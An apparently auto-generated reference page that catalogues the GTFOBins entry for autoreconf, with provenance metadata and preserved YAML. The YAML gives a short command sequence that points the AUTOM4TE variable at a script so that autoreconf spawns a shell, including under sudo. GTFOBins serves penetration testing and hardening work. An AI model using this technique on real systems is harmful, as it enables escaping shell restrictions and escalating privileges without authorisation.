---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# autoreconf

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `autoreconf` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoreconf` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [autoreconf](../../tools/linux/autoreconf.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | autoreconf |
| name | autoreconf |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/autoreconf/ |

## Preserved Source Material

```yaml
_body: ''
_name: autoreconf
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoreconf
functions:
  shell:
  - code: 'echo ''/bin/sh 1>&0'' >/path/to/temp-file

      chmod +x /path/to/temp-file

      echo AC_INIT >configure.ac

      AUTOM4TE=/path/to/temp-file autoreconf'
    comment: The shell is invoked multiple times.
    contexts:
      sudo: null
      unprivileged: null
```
